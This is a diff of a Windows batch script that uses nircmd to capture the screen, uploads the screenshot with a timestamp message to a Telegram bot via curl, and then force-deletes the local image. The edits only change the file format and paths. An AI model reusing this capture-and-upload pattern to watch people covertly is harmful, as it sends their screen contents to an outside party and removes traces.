@@ -2,7 +2,7 @@
 ::goto :EOF
 
 setlocal enabledelayedexpansion
-set "BATCHVERSION=2.9"
+set "BATCHVERSION=3.0"
 
 
 
@@ -137,12 +137,12 @@ set "TOPIC_ID_MyScrn=74293"
 set "MESSAGE_MyScrn=Left......|%time%|"
 set "ENCODED_MESSAGE_MyScrn=%MESSAGE_MyScrn: =%%2"
 set "CAPTION_MyScrn="
-set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
+set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.jpg"
 
 
 
 
-"%nircmd%" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
+"%nircmd%" savescreenshot "%FILE_PATH_MyScrn%"
 
 
 :: Send Photo
@@ -156,7 +156,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
 echo 0 > "%LASTRUNFILE%"
 
 
-del /f /q "%USERPROFILE%\Downloads\screenshot.png"
+del /f /q "%FILE_PATH_MyScrn%"
 
 
 :NEXT1
